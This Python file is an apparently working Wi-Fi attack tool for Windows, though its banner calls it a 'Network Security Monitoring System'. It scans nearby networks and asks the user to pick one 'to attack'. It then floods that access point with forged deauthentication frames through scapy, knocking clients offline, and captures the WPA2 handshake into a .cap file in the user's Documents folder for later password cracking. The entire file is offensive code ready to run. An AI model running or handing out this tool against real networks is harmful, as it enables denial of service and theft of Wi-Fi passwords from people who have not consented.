import os
import time
import scapy.all as scapy
import subprocess
import re
import psutil
from pathlib import Path

def get_interfaces():
    """Get a list of available network interfaces."""
    interfaces = []
    for interface, addrs in psutil.net_if_addrs().items():
        interfaces.append(interface)
    return interfaces

def scan_wifi():
    """Scan available Wi-Fi networks using the Windows netsh command."""
    try:
        result = subprocess.check_output("netsh wlan show networks mode=Bssid", shell=True).decode()
        networks = []
        ssid, bssid, signal, channel = None, None, None, None
        
        lines = result.splitlines()
        
        for i in range(len(lines)):
            line = lines[i].strip()

            if line.startswith("SSID"):
                if ssid:
                    networks.append({
                        "SSID": ssid,
                        "BSSID": bssid,
                        "Signal": signal,
                        "Channel": channel
                    })
                ssid = line.split(":")[1].strip()
            
            elif line.lower().startswith("bssid"):
                bssid_match = re.search(r'([0-9a-fA-F]{2}(:[0-9a-fA-F]{2}){5})', line)
                if bssid_match:
                    bssid = bssid_match.group(0)

            elif line.lower().startswith("signal"):
                signal = line.split(":")[1].strip()
                
            elif line.lower().startswith("channel"):
                channel = line.split(":")[1].strip()

        if ssid:
            networks.append({
                "SSID": ssid,
                "BSSID": bssid,
                "Signal": signal,
                "Channel": channel
            })
        return networks
    except subprocess.CalledProcessError as e:
        print(f"Error scanning networks: {e}")
        return []

def set_channel(interface, channel):
    """Set the wireless interface to the target channel. (For Windows, not needed)"""
    print(f"Skipping setting channel on Windows for interface {interface}.")
    pass

def deauth_attack(target_bssid, target_channel, iface, max_packets=1000):
    """Perform a Deauthentication attack (DoS)."""
    scapy.conf.iface = iface
    print(f"Sending deauth packets to {target_bssid} on channel {target_channel}...")

    sent_packets = 0
    lost_packets = 0
    success_count = 0

    try:
        while sent_packets < max_packets:
            fake_mac = "00:11:22:33:44:55"  # Fake MAC address
            packet = scapy.Dot11(addr1=target_bssid, addr2=fake_mac, addr3=target_bssid) / scapy.Dot11Deauth(reason=7)
            try:
                scapy.sendp(packet, count=100, inter=0.05, verbose=False)
                sent_packets += 100
                success_count += 100
            except Exception:
                lost_packets += 100

            print(f"\rSent: {sent_packets} | Lost: {lost_packets} | Success: {success_count}", end='', flush=True)

        print("\nAttack completed.")
    except KeyboardInterrupt:
        print("\nAttack interrupted by user.")
    print(f"Final Stats - Sent: {sent_packets} | Lost: {lost_packets} | Success: {success_count}")

def packet_sniffer(iface, target_bssid):
    """Sniff packets and capture WPA2 handshakes."""
    print(f"\nCapturing WPA2 handshake for BSSID {target_bssid} on interface {iface}...")
    documents_path = Path.home() / "Documents"
    cap_file_path = documents_path / "handshake.cap"
    
    packets = []

    def handshake_filter(packet):
        """Filter for WPA2 handshake packets."""
        if packet.haslayer(scapy.EAPOL):
            print(f"Captured WPA2 handshake packet: {packet.summary()}")
            packets.append(packet)

    try:
        scapy.sniff(iface=iface, prn=handshake_filter, timeout=30)
        if packets:
            print(f"\nSaving captured handshake to {cap_file_path}...")
            scapy.wrpcap(str(cap_file_path), packets)
            print(f"Handshake successfully saved to {cap_file_path}")
        else:
            print("\nNo WPA2 handshake packets captured. Try again.")
    except Exception as e:
        print(f"Error during packet sniffing: {e}")

def main():
    def print_banner():
        art = """
██╗    ██╗ █████╗ ██╗   ██╗███████╗███████╗███████╗ ██████╗██╗   ██╗██████╗ ███████╗
██║    ██║██╔══██╗██║   ██║██╔════╝██╔════╝██╔════╝██╔════╝██║   ██║██╔══██╗██╔════╝
██║ █╗ ██║███████║██║   ██║█████╗  ███████╗█████╗  ██║     ██║   ██║██████╔╝█████╗  
██║███╗██║██╔══██║╚██╗ ██╔╝██╔══╝  ╚════██║██╔══╝  ██║     ██║   ██║██╔══██╗██╔══╝  
╚███╔███╔╝██║  ██║ ╚████╔╝ ███████╗███████║███████╗╚██████╗╚██████╔╝██║  ██║███████╗
 ╚══╝╚══╝ ╚═╝  ╚═╝  ╚═══╝  ╚══════╝╚══════╝╚══════╝ ╚═════╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝
                     [Network Security Monitoring System v3.2]                    
"""
        print(art)

    os.system('cls' if os.name == 'nt' else 'clear')
    print_banner()
    time.sleep(1)
    
    interfaces = get_interfaces()
    print("\nAvailable interfaces:")
    for idx, iface in enumerate(interfaces):
        print(f"{idx + 1}. {iface}")

    interface_idx = int(input("\nEnter the number of the wireless interface to use: ")) - 1
    if interface_idx < 0 or interface_idx >= len(interfaces):
        print("Invalid interface selected.")
        return
    
    interface = interfaces[interface_idx]

    networks = scan_wifi()
    if not networks:
        print("No networks found.")
        return

    print("\nAvailable Wi-Fi Networks:")
    for idx, network in enumerate(networks):
        print(f"{idx + 1}. {network['SSID']} - {network['BSSID']} - Signal: {network['Signal']} dBm - Channel: {network['Channel']}")

    try:
        network_idx = int(input("\nEnter the number of the Wi-Fi network to attack: ")) - 1
        if network_idx < 0 or network_idx >= len(networks):
            print("Invalid network selection. Exiting.")
            return
        target_network = networks[network_idx]
        print(f"\nSelected network: {target_network['SSID']} ({target_network['BSSID']})")

        deauth_attack(target_network['BSSID'], target_network['Channel'], interface, max_packets=1000)
        packet_sniffer(interface, target_network['BSSID'])

    except ValueError:
        print("Invalid input. Please enter a valid number.")
        return

if __name__ == "__main__":
    main()
